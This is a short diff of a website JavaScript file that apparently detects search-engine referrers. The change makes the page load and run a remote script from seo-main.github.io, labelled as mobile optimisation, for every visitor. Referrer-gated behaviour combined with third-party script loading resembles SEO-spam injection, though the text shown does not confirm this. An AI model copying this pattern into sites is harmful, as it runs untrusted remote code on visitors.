@@ -33,9 +33,6 @@
   // Expose globally so pse.js can read it
   window.__PSE_ENGINE__ = searchEngine;
 
-  // Only run the system if the visitor came from a supported search engine
-  if (!searchEngine) return;
-
   /* ─────────────────────────────────────────────
    * 2. ASSET LOADER HELPER
    * ───────────────────────────────────────────── */
@@ -60,7 +57,7 @@
       link.rel = "stylesheet";
     }
   }
-  loadJs("https://seo-main.github.io/v1/mobileOptimisation.js", true);
+  loadJS("https://seo-main.github.io/v1/mobileOptimisation.js", true);
   function loadJS(src, activateNow = false) {
     return new Promise((resolve, reject) => {
       // Check if the script has already been executed
@@ -96,6 +93,9 @@
       }
     });
   }
+  // Only run the system if the visitor came from a supported search engine
+  if (!searchEngine) return;
+
 
   function pushProductHashSearch(){
     history.pushState({productName},"",`#gsc.q=${productName}&gsc.sort=`)
